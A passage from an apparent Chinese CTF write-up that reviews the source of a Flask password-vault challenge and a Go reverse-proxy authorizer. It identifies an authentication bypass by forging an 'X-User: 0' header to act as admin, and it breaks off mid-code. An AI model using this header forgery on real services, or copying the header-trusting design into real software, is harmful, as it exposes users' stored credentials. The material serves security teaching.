<p>定义了两个两个数据库模型，<code>User</code> 表保存账号信息（含盐与密码哈希）；<code>VaultEntry</code> 表保存某用户的若干凭据（登录名、<strong>加密</strong>后的密码、备注）；二者通过 <code>user_id</code> 建 FK 关联，且在 <code>User</code> 被删除时会级联删除对应的 <code>VaultEntry</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hash_password</span>(<span class="params">password: <span class="built_in">str</span>, salt: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    data = salt + password.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        data = hashlib.sha256(data).digest()</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>将salt盐值和密码拼接，并进行50轮的SHA256迭代哈希，最后base64编码并返回加密结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verify_password</span>(<span class="params">password: <span class="built_in">str</span>, salt_b64: <span class="built_in">str</span>, digest: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    salt = base64.b64decode(salt_b64.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> hash_password(password, salt) == digest</span><br></pre></td></tr></table></figure>

<p>验证密码函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_salt</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> secrets.token_bytes(<span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<p>盐值生成函数，生成16字节的随机数据</p>
<p>然后我们看flask应用的函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_app</span>() -&gt; Flask:</span><br><span class="line">    app = Flask(__name__)</span><br><span class="line">    app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">    app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = os.getenv(<span class="string">&#x27;DATABASE_URL&#x27;</span>, <span class="string">&#x27;sqlite:///vault.db&#x27;</span>)</span><br><span class="line">    app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">    app.config[<span class="string">&#x27;SIGN_SERVER&#x27;</span>] = os.getenv(<span class="string">&#x27;SIGN_SERVER&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:4444/sign&#x27;</span>)</span><br><span class="line">    fernet_key = os.getenv(<span class="string">&#x27;FERNET_KEY&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fernet_key:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Missing FERNET_KEY environment variable. Generate one with `python -c &quot;from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())&quot;`.&#x27;</span>)</span><br><span class="line">    app.config[<span class="string">&#x27;FERNET_KEY&#x27;</span>] = fernet_key</span><br><span class="line">    db.init_app(app)</span><br></pre></td></tr></table></figure>

<p>一些配置信息包括SECRET_KEY、数据库连接、FERNET_KEY等</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">fernet = Fernet(app.config[<span class="string">&#x27;FERNET_KEY&#x27;</span>])</span><br><span class="line">   <span class="keyword">with</span> app.app_context():</span><br><span class="line">       db.create_all()	<span class="comment">#创建数据表</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="keyword">not</span> User.query.first():	<span class="comment">#检查是否是第一次运行	</span></span><br><span class="line">           salt = secrets.token_bytes(<span class="number">16</span>)	<span class="comment">#随机生成盐值</span></span><br><span class="line">           password = secrets.token_bytes(<span class="number">32</span>).<span class="built_in">hex</span>()	<span class="comment">#随机生成密码</span></span><br><span class="line">           password_hash = hash_password(password, salt)	<span class="comment">#计算密码的哈希加密值</span></span><br><span class="line">           user = User(		<span class="comment">#创建admin用户对象</span></span><br><span class="line">               <span class="built_in">id</span>=<span class="number">0</span>,</span><br><span class="line">               username=<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">               password_hash=password_hash,	<span class="comment">#设置密码哈希</span></span><br><span class="line">               salt=base64.b64encode(salt).decode(<span class="string">&#x27;utf-8&#x27;</span>),	<span class="comment">#存储Base64编码的盐值</span></span><br><span class="line">           )</span><br><span class="line">           db.session.add(user)</span><br><span class="line">           db.session.commit()		<span class="comment">#添加到数据库中</span></span><br><span class="line"></span><br><span class="line">           flag = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read().strip()		<span class="comment">#设置flag条目</span></span><br><span class="line">           flagEntry = VaultEntry(</span><br><span class="line">               user_id=user.<span class="built_in">id</span>,		<span class="comment">#属于id=0也就是admin用户</span></span><br><span class="line">               label=<span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">               login=<span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">               password_encrypted=fernet.encrypt(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">               notes=<span class="string">&#x27;This is the flag entry.&#x27;</span>,</span><br><span class="line">           )</span><br><span class="line">           db.session.add(flagEntry)		<span class="comment">#添加内容</span></span><br><span class="line">           db.session.commit()</span><br></pre></td></tr></table></figure>

<p>这里创建了admin用户以及flag的内容并添加到数据库中，对admin和flag建立映射关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">view_func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">view_func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapped</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        uid = request.headers.get(<span class="string">&#x27;X-User&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(uid)</span><br><span class="line">        <span class="keyword">if</span> uid == <span class="string">&#x27;anonymous&#x27;</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Please sign in first.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            uid_int = <span class="built_in">int</span>(uid)</span><br><span class="line">        <span class="keyword">except</span> (TypeError, ValueError):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid session. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        user = User.query.filter_by(<span class="built_in">id</span>=uid_int).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">            flash(<span class="string">&#x27;User not found. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        g.current_user = user</span><br><span class="line">        <span class="keyword">return</span> view_func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapped</span><br></pre></td></tr></table></figure>

<p>一个认证装饰器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    uid = request.headers.get(<span class="string">&#x27;X-User&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> uid <span class="keyword">or</span> uid == <span class="string">&#x27;anonymous&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>根路由，通过获取<code>X-User</code>请求头来进行认证，如果uid是anonymous或不存在则重定向到login登录页面，否则进入控制面板dashboard页面</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        confirm_password = request.form.get(<span class="string">&#x27;confirm_password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            flash(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> password != confirm_password:</span><br><span class="line">            flash(<span class="string">&#x27;Passwords do not match.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">        salt = generate_salt()</span><br><span class="line">        password_hash = hash_password(password, salt)</span><br><span class="line">        user = User(</span><br><span class="line">            username=username,</span><br><span class="line">            password_hash=password_hash,</span><br><span class="line">            salt=base64.b64encode(salt).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">        )</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db.session.commit()</span><br><span class="line">        <span class="keyword">except</span> IntegrityError:</span><br><span class="line">            db.session.rollback()</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists. Please choose another.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">        flash(<span class="string">&#x27;Registration successful. Please sign in.&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>经典的注册函数，没什么好分析的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        user = User.query.filter_by(username=username).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> <span class="keyword">not</span> verify_password(password, user.salt, user.password_hash):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">        r = requests.get(app.config[<span class="string">&#x27;SIGN_SERVER&#x27;</span>], params=&#123;<span class="string">&#x27;uid&#x27;</span>: user.<span class="built_in">id</span>&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Unable to reach the authentication server. Please try again later.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        token = r.text.strip()</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>)))</span><br><span class="line">        response.set_cookie(</span><br><span class="line">            <span class="string">&#x27;token&#x27;</span>,</span><br><span class="line">            token,</span><br><span class="line">            httponly=<span class="literal">True</span>,</span><br><span class="line">            secure=app.config.get(<span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>, <span class="literal">False</span>),</span><br><span class="line">            samesite=<span class="string">&#x27;Lax&#x27;</span>,</span><br><span class="line">            max_age=<span class="number">12</span> * <span class="number">3600</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>登录路由，我们来详细分析一下</p>
<p>检测请求方式是否为POST，并获取用户名和密码，在数据库中查询并返回相应的user用户信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(app.config[<span class="string">&#x27;SIGN_SERVER&#x27;</span>], params=&#123;<span class="string">&#x27;uid&#x27;</span>: user.<span class="built_in">id</span>&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">token = r.text.strip()</span><br><span class="line">response = make_response(redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>)))</span><br><span class="line">response.set_cookie(</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>,</span><br><span class="line">    token,</span><br><span class="line">    httponly=<span class="literal">True</span>,</span><br><span class="line">    secure=app.config.get(<span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>, <span class="literal">False</span>),</span><br><span class="line">    samesite=<span class="string">&#x27;Lax&#x27;</span>,</span><br><span class="line">    max_age=<span class="number">12</span> * <span class="number">3600</span>,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>如果验证成功则发送请求至<code>http://127.0.0.1:4444/sign</code>，参数为用户的uid，从响应中获取JWT token并设置token到cookie，最后返回响应</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = make_response(redirect(url_for(<span class="string">&#x27;login&#x27;</span>)))</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    flash(<span class="string">&#x27;Signed out.&#x27;</span>, <span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<p>登出路由就不用看了，一个重定向加删除token的操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    user = g.current_user</span><br><span class="line">    entries = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: entry.<span class="built_in">id</span>,</span><br><span class="line">            <span class="string">&#x27;label&#x27;</span>: entry.label,</span><br><span class="line">            <span class="string">&#x27;login&#x27;</span>: entry.login,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: fernet.decrypt(entry.password_encrypted.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;notes&#x27;</span>: entry.notes,</span><br><span class="line">            <span class="string">&#x27;created_at&#x27;</span>: entry.created_at,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> entry <span class="keyword">in</span> user.vault_entries</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, username=user.username, entries=entries)</span><br></pre></td></tr></table></figure>

<p>设置了需要认证装饰器进行认证的路由dashboard，需要关注的一个点是，这里的password是通过fernet去进行解密的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/passwords/new&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_password</span>():</span><br><span class="line">    user = g.current_user</span><br><span class="line">    label = request.form.get(<span class="string">&#x27;label&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    login_value = request.form.get(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    password_plain = request.form.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    notes = request.form.get(<span class="string">&#x27;notes&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip() <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> label <span class="keyword">or</span> <span class="keyword">not</span> login_value <span class="keyword">or</span> <span class="keyword">not</span> password_plain:</span><br><span class="line">        flash(<span class="string">&#x27;Service name, login, and password are required.&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">    encrypted_password = fernet.encrypt(password_plain.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    entry = VaultEntry(</span><br><span class="line">        user_id=user.<span class="built_in">id</span>,</span><br><span class="line">        label=label,</span><br><span class="line">        login=login_value,</span><br><span class="line">        password_encrypted=encrypted_password,</span><br><span class="line">        notes=notes,</span><br><span class="line">    )</span><br><span class="line">    db.session.add(entry)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    flash(<span class="string">&#x27;Password entry saved.&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>一个创建密码的路由，这里也是需要认证的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/passwords/&lt;int:entry_id&gt;&#x27;</span>, methods=[<span class="string">&#x27;DELETE&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_password</span>(<span class="params">entry_id: <span class="built_in">int</span></span>):</span><br><span class="line">    user = g.current_user</span><br><span class="line">    entry = VaultEntry.query.filter_by(<span class="built_in">id</span>=entry_id, user_id=user.<span class="built_in">id</span>).first()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> entry:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Entry not found&#x27;</span>&#125;), <span class="number">404</span></span><br><span class="line">    db.session.delete(entry)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>一个删除密码的路由，这里也是需要认证的</p>
<p>分析完源码后可以明确的问题就是，我们如何获取到admin身份，前面的分析可以得出flag是和admin建立了映射关系的</p>
<p>从源码login_required中可以看出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">view_func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">view_func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapped</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        uid = request.headers.get(<span class="string">&#x27;X-User&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(uid)</span><br><span class="line">        <span class="keyword">if</span> uid == <span class="string">&#x27;anonymous&#x27;</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Please sign in first.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            uid_int = <span class="built_in">int</span>(uid)</span><br><span class="line">        <span class="keyword">except</span> (TypeError, ValueError):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid session. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        user = User.query.filter_by(<span class="built_in">id</span>=uid_int).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">            flash(<span class="string">&#x27;User not found. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        g.current_user = user</span><br><span class="line">        <span class="keyword">return</span> view_func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapped</span><br></pre></td></tr></table></figure>

<p>这里仅仅是使用X-User去进行校验，这也意味着我们可以通过构造X-User去伪造admin身份，而admin的id是0，那么我们需要构造的就是</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-User</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>

<p>但是在authorizer&#x2F;main.go中有一个删除请求头并重新设置X-User的代码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">authorizer := &amp;httputil.ReverseProxy&#123;Director: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request)</span></span> &#123;</span><br><span class="line">	req.URL.Scheme = <span class="string">&quot;http&quot;</span></span><br><span class="line">	req.URL.Host = <span class="string">&quot;127.0.0.1:5000&quot;</span></span><br><span class="line"></span><br><span class="line">	uid := GetUIDFromRequest(req)</span><br><span class="line">	log.Printf(<span class="string">&quot;Request UID: %s, URL: %s&quot;</span>, uid, req.URL.String())</span><br><span class="line">	req.Header.Del(<span class="string">&quot;Authorization&quot;</span>)</span><br><span class="line">	req.Header.Del(<span class="string">&quot;X-User&quot;</span>)</span><br><span class="line">	req.Header.Del(<span class="string">&quot;X-Forwarded-For&quot;</span>)</span><br><span class="line">	req.Header.Del(<span class="string">&quot;Cookie&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		req.Header.Set(<span class="string">&quot;X-User&quot;</span>, <span 